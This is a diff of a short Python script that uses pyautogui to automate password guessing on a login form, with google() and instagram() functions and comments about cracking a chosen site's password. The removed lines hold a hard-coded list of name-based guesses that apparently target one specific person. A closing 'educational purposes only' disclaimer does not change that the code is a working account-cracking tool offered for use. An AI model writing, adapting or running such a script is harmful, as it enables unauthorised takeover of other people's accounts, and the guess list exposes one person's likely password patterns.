@@ -1,20 +1,32 @@
 import pyautogui as bot
 import time as t
 
-possible_passwords = '''Sarankumarrio22@# Sarankumarrio2002@# Sarankumar@20022 Riokumarsaran22@# Saranriokumar2002@# Saranriokumar22@# Saranriokumar222002@# Sarankumar@22 Saranriokumar@2002 Kumarsaran2002@#'''
+possible_passwords = ''' ''' # add possible passwords here with space in between eg 'password1 password2 password3'
 
 pass_list =list(possible_passwords.split(' '))
-# for i in pass_list:
+# for i in pass_list: 
 #     print(i)
+# uncomment the above lines to check if the passwords are correctly added to the list
 t.sleep(5)
-for i in pass_list:
-    t.sleep(1)
-    bot.write(f'{i}')
-    bot.press('enter')
-    t.sleep(4)
-    bot.click(button='left')
-    bot.hotkey('ctrl', 'a')
-    bot.press('backspace')
-    print(f'{i} is not the password')
+def google():
+    for i in pass_list:
+        bot.typewrite(i)
+        bot.press('enter')
+        t.sleep(1)
 
-print('All passwords are tried')
+def instagram():
+    for i in pass_list:
+        bot.typewrite(i)
+        bot.press('enter')
+        t.sleep(1)
+        bot.click() # place the cursor where the password is to be entered and click to focus on the password field
+        bot.hotkey('ctrl', 'a')
+        bot.press('backspace')
+
+# call the function according to the website you want to crack the password for
+# google()
+# instagram()
+
+'''note: this code is for educational purposes only and should not be used for illegal activities. Always ensure you have permission to test the security of any system.
+This code is not guaranteed to work and may cause harm to your system if used improperly. Use at your own risk. and also while running the code make sure to have the cursor focused on the password field of the website you want to crack the password for.
+to stop the code while its running make sure to run on a terminal and press ctrl + c to stop the execution. make sure to have the necessary permissions to test the security of any system.'''
